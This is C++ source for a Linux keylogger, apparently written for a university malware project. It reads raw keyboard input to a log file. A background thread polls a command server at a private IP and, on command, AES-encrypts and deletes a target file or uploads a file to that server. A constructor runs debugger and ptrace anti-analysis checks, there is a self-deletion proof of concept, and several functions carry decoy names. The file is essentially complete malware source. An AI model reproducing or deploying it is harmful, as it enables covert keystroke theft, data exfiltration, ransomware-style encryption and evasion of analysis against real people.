#include <sys/stat.h>
#include <linux/input.h>
#include <cstring>
#include <fstream>
#include <unistd.h>
#include <iostream>
#include <filesystem>
#include <fcntl.h>
#include <random>
#include <chrono>
#include <signal.h>
#include <string>
#include <thread>
#include <vector>
#include <sstream>
#include <wait.h>
#include <bits/sigaction.h>
#include <bits/signum-arch.h>
#include <bits/sigthread.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <linux/limits.h>
#include <crypto++/cryptlib.h>
#include <crypto++/osrng.h>
#include "k3yl0gg3r.h"
#include "h3lp3r.h"
#include "encrypt0r.h"

int loop = 1;
int request = 1;
int enc = 0;
int uploaded = 0;

int filler1() {
    int arr[5][5];

    for (int i = 0; i < 5; i++) {
        for (int j = 0; j < 5; j++) {
            arr[i][j] = i * 5 + j + 1;
        }
    }

    for (int i = 0; i < 5; i++) {
        for (int j = 0; j < 5; j++) {
            std::cout << arr[i][j] << " ";
        }
        std::cout << std::endl;
    }

    return 0;
}

int filler2(int n) {
    if (n <= 0) {
        return 0;
    } else {
        return n + filler2(n - 1);
    }
}

bool hasEnding(std::string const &fullString, std::string const &ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    } else {
        return false;
    }
}

bool isBeingDebugged() {
    bool state = false;
    std::string stat;
    std::ifstream file("/proc/self/stat");

    for (int i = 0; i < 4; ++i) {
        file >> stat;
    }

    std::string parentPath = std::string("/proc/") + stat + "/exe";
    char path[PATH_MAX + 1];
    memset(path, 0, PATH_MAX + 1);
    readlink(parentPath.c_str(), path, PATH_MAX);

    std::vector<std::string> debuggers = {
        "gdb",
        "lldb-server"
    };

    for (auto &p: debuggers) {
        if (hasEnding(std::string(path), p)) {
            state = true;
            break;
        }
    }

    return state;
}

void __attribute__((constructor)) hello() {
    std::cout << "Wierd" << std::endl;
    const auto cpus = std::thread::hardware_concurrency();
    std::cout << cpus << std::endl;
    if ((int) cpus < 4) {
        std::cout << "Hmmm..." << std::endl;
        filler1();
        // exit(0);
    }
    /* detection method 1 */
    if (isBeingDebugged()) {
        std::cout << "Being debugged" << std::endl;
        filler2(50);
        // exit(0);
    }
    /* end detection method 1 */

    /* detection method 2 */
    int offset = 0;

    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == 0) {
        offset = 2;
    }

    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        offset *= 3;
    }

    if (offset == 2 * 3) {
        std::cout << "normal" << std::endl;
    } else {
        std::cout << "being traced!" << std::endl;
        filler1();
        filler2(50);
        // exit(0);
    }
    /* end detection method 2 */
}

/* POC self-deletion */
int bye(void* addr, int length) {
    int wstatus;
    pid_t child;
    int thread_cancel_state;
    sigset_t signal_set;
    sigset_t old_signal_set;

    const pid_t parent = getpid();
    pthread_setcancelstate(PTHREAD_CANCEL_DISABLE, &thread_cancel_state);
    sigfillset(&signal_set);
    pthread_sigmask(SIG_SETMASK, &signal_set, &old_signal_set);
    if (0 == (child = vfork())) {
        int err = 0;
        kill(parent, SIGSTOP);
        if (-1 == munmap(addr, length)) {
            err = 1;
        }
        else if ((void*)-1 == mmap(addr, length, PROT_NONE, MAP_ANONYMOUS, -1, 0)) {
            err = 1;
        }
        kill(parent, SIGCONT);
        _exit(err);
    }
    if (child > 0) {
        waitpid(child, &wstatus, 0);
    }
    else {
        wstatus = 255;
    }

    pthread_sigmask(SIG_SETMASK, &old_signal_set, &signal_set);
    pthread_setcancelstate(thread_cancel_state, &thread_cancel_state);
    return (wstatus & 255) != 0;
}
/* end POC */

void sigintHandler(int sig) {
    loop = 0;
}

void dummy1() {
    const std::string inputFile = "/home/anthony/Desktop/projects/master-upc/malware/encrypt_me.txt";
    const std::string encryptedFile = "/home/anthony/Desktop/projects/master-upc/malware/encrypted_output.nope";

    if (!enc) {
        if (std::filesystem::exists(inputFile)) {
            // Generate a random 256-bit key and 128-bit IV
            CryptoPP::SecByteBlock key(32);
            CryptoPP::SecByteBlock iv(16);

            CryptoPP::AutoSeededRandomPool prng;
            prng.GenerateBlock(key, key.size());
            prng.GenerateBlock(iv, iv.size());

            encryptFile(key, iv, inputFile, encryptedFile);

            // remove the original file
            if (std::remove(inputFile.c_str()) == 0) {
                std::cout << "Successfully removed file" << std::endl;
            } else {
                std::cerr << "Error deleting file" << std::endl;
            }

            enc = 1;
        } else {
            std::cout << "File doesn't exist" << std::endl;
        }

    } else {
        std::cout << "File already encrypted" << std::endl;
    }
}

void dummy2() {
    std::cout << "From dummy 2" << std::endl;
}

void dummy3() {
    std::cout << "From dummy 3" << std::endl;
    if (!uploaded) {
        std::string url = "https://192.168.80.243/upload";
        // std::string filePath = "/home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/outFILE";
        std::string filePath = "/home/anthony/Desktop/newest2";
        if (sendFile(url, filePath)) {
            std::cout << "Sent file" << std::endl;
            uploaded = 1;
        } else {
            std::cout << "Error sending file" << std::endl;
        }
    } else {
        // maybe the logic shouldn't be like this
        std::cout << "Already uploaded file" << std::endl;
    }
}

void makeRequestDelay() {
    std::random_device rand;
    std::mt19937 gen(rand());

    while (request) {
        std::uniform_int_distribution<> distribution(2, 5); // random time between 2 and 5 seconds
        int delay = distribution(gen);

        serverResponse response{};
        makeRequest("https://192.168.80.243/command", response);

        int convertedToBinary = (response.action0 << 4) |
                                (response.action1 << 3) |
                                (response.action2 << 2) |
                                (response.action3 << 1) |
                                (response.action4);

        switch(convertedToBinary) {
            case 0b10101:
                dummy1();
                break;
            case 0b10000:
                dummy2();
                break;
            case 0b00001:
                dummy3();
                break;
            default:
                // std::cout << "In default case" << std::endl;
                break;
        }

        std::this_thread::sleep_for(std::chrono::seconds(delay));
    }
}

int main(const int argc, char *argv[]) {
    /*
     * this was an attempt to get the address of the process so we
     * could proceed with self-deletion (mmap() minimum requirements
     * are address and length.
     *
     * This parsing works only if the output of /proc/self/maps is
     * one line. In our case, there are multiple lines and I'm not
     * sure how to parse this.

    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd == -1) {
        perror("Error opening /proc/self/maps");
        return 1;
    }

    char buffer[4096];
    ssize_t bytesRead = read(fd, buffer, sizeof(buffer) - 1);
    if (bytesRead == -1) {
        perror("Error reading /proc/self/maps");
        close(fd);
        return 1;
    }

    buffer[bytesRead] = '\0';

    std::cout << "Memory mapping information:\n" << buffer << std::endl;

    close(fd);

    uintptr_t address;
    size_t length;

    std::istringstream iss(buffer);
    if (!(iss >> std::hex >> address >> std::hex >> std::ws >> length)) {
        std::cerr << "Error parsing memory mapping information\n";
        return 1;
    }

    if (iss.fail()) {
        std::cerr << "Error parsing memory mapping information\n";
        return 1;
    }
    */


    std::chrono::steady_clock::time_point begin, end;
    const std::string keyboardDevice = getKeyboardDevice();

    if (argc < 2) {
        printUsageAndExit(argv[0]);
    }

    if (keyboardDevice.empty()) {
        printUsageAndExit((argv[0]));
    }

    int writeout;
    int keyboard;

    if(keyboardDevice.empty()) {
        printUsageAndExit(argv[0]);
    }

    if((writeout = open(argv[1], O_RDWR | O_APPEND | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH)) < 0) {
        std::cerr << "Error opening file " << argv[1] << ": " << strerror(errno) << std::endl;
        return 1;
    }
    // if((writeout = open(argv[1], O_RDWR | O_APPEND)) < 0) {
    //     std::cerr << "Error opening file " << argv[1] << ": " << strerror(errno) << std::endl;
    //     return 1;
    // }

    if((keyboard = open(keyboardDevice.c_str(), O_RDONLY)) < 0) {
        std::cerr << "Error accessing keyboard from " << keyboardDevice << ". May require you to be superuser." << std::endl;
        return 1;
    }

    std::cout << "Keyboard device: " << keyboardDevice << std::endl;

    std::thread serverReqThread(makeRequestDelay);

    keylogger(keyboard, writeout);

    close(keyboard);
    close(writeout);

    return 0;
}